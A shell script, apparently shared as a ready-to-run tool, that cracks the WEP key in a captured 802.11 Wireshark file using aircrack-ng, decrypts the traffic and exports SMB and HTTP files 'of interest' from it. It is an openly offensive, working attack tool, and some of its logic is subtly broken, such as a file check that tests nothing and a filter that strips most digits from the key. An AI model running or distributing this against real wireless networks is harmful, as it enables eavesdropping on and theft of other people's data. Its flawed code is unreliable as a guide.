#!/bin/sh

# -------------------------------------------------------------------------------------
#   A SIMPLE BASH UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK
#
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
#
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
#                   GRAB THE 1ST COMMAND LINE ARGUMENT (.PCAP FILE) 
# -------------------------------------------------------------------------------------

INFILE=$1

# -------------------------------------------------------------------------------------
#                               SHOW A UNIVERSAL HEADER
# -------------------------------------------------------------------------------------

echo "\nPCAP-CRACKER - SSID AND WEP KEY CRACKER FOR IEEE (802.11) RADIO .PCAP FILES"
echo "\n          BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)\n\n\n"

# -------------------------------------------------------------------------------------
#                          CONDUCT ROUTINE AND SIMPLE TESTS.
# -------------------------------------------------------------------------------------

if [ $USER != "root" ]
	then echo "Please run this bash script as root..."
	exit 1
fi

if [ $# -eq 0 ]
	then echo "Use the command sh pcap-cracker.sh wiresharkFile.pcap\n"
	exit 1
fi

if [ ! -f $INFILE ] 
	then echo "Stipulated file not found... Have you spelt it correctly?"
	exit 1
fi

# -------------------------------------------------------------------------------------
#             CHECK ALL REQUIRED DEPENDENCIES ARE INSTALLED ON THE SYSTEM.
# -------------------------------------------------------------------------------------

installed=0

type pcapfix > /dev/null
ReturnValue=$?

if [ $ReturnValue != "0" ]
	then echo "Installing pcapfix...\n"
	apt-get install pcapfix
	installed=1
fi
 
type airmon-ng > /dev/null
ReturnValue=$?

if [ $ReturnValue != "0" ]
	then echo "Installing aircrack-ng...\n"
	apt-get install build-essential
	apt-get install libssl-dev
	apt-get install subversion
	apt-get install checkinstall
	git clone https://github.com/aircrack-ng/aircrack-ng.git
	cd aircrack-ng
	make experimental=true 
	make install
	cd ..
	airodump-ng-oui-update
	installed=1
fi

type tshark > /dev/null
ReturnValue=$?

if [ $ReturnValue != "0" ]
	then echo "Installing tshark...\n"
	add-apt-repository ppa:dreibh/ppa
	apt-get install wireshark 
	apt-get install tshark
	installed=1
fi

if [ $installed = 0 ]
	then echo "\nLooking good - all required dependencies were pre-installed..."
else
	echo "\nLooking good - missing dependencies have been installed for you..."
fi

# -------------------------------------------------------------------------------------
#     SOMETIMES CAPTURED .PCAP FILES GET CUT OFF OR ARE CORRUPTED IN OTHER WAYS
# -------------------------------------------------------------------------------------

echo "\nOK, I am just going to check the file $INFILE for errors..."
pcapfix -d $INFILE -o Fixerror.pcap > /dev/null

test Fixerror.pcap
ReturnValue=$?

if [ $ReturnValue != "0" ]
	then mv $INFILE Oldpcapfile.pcap
	mv Fixerror.pcap $INFILE
	echo "\nErrors have been fixed... Your orginal file $INFILE has been renamed Oldpcapfile.pcap."
	exit 0
else 
	echo "\nGreat!! no errors have been found..."
fi

# -------------------------------------------------------------------------------------
#                       NEXT EXTRACT THE SSID FROM THE .PCAP FILE
# -------------------------------------------------------------------------------------

echo "\nI am now going to extract the SSID from the file..."
SSID=$(tcpdump -ennr $INFILE '(type mgt subtype beacon)' | awk '{print $13}' | sed "s/[()]//g;s/......//" | sort | uniq) 2>null
SSID="00:$SSID"
echo $SSID > SSID.txt
echo "\nFabulous!! the file SSID.txt now contains the SSID for $INFILE..."

# -------------------------------------------------------------------------------------
#           NOW LETS EXTRACT THE WEP KEY FROM THE .PCAP FILE USING THE SSID
# -------------------------------------------------------------------------------------

echo "\nLets now grab the WEP KEY from the file..."
aircrack-ng -b $SSID $INFILE > Key.txt 
grep -o '![^"]*' Key.txt > Key2.txt
cat Key2.txt | sed 's/[^a-z  A-Z 0-1 :]//g' > Key3.txt
cat Key3.txt | tr -d " \t\n\r" > WepKey.txt
rm Key.txt
rm Key2.txt
rm Key3.txt
echo "\nSuper!! the file WepKey.txt now contains the Wep-key for $INFILE..."

# -------------------------------------------------------------------------------------
#           USING THE WEP KEY CREATE A CRACKED VERSION OF THE .PCAP FILE
# -------------------------------------------------------------------------------------

echo "\nRight, now I am going to decrypt your $INFILE file..."
WEP=`cat WepKey.txt`
airdecap-ng -w $WEP $INFILE > /dev/null
INFILE=${INFILE%?}
INFILE=${INFILE%?}
INFILE=${INFILE%?}
INFILE=${INFILE%?}
INFILE=${INFILE%?}
INFILE="${INFILE}-dec.pcap"
NEWFILE="Cracked.pcap"
mv $INFILE $NEWFILE
echo "\nFantastic!! A cracked version of your file is now available for use with Wireshark..."

# -------------------------------------------------------------------------------------
#                  NOW CONDUCT SOME RECONISSANCE ON THE CRACKED FILE
# -------------------------------------------------------------------------------------

echo "\nFinally - I will try and export some objects for you, they might contain something of interest!!..."
tshark -nr $NEWFILE --export-objects smb,Smbfolder >null 2>null
tshark -nr $NEWFILE --export-objects http,Httpfolder >null 2>null
rm null
echo "\nAll done!!, take a look...\n"
ls


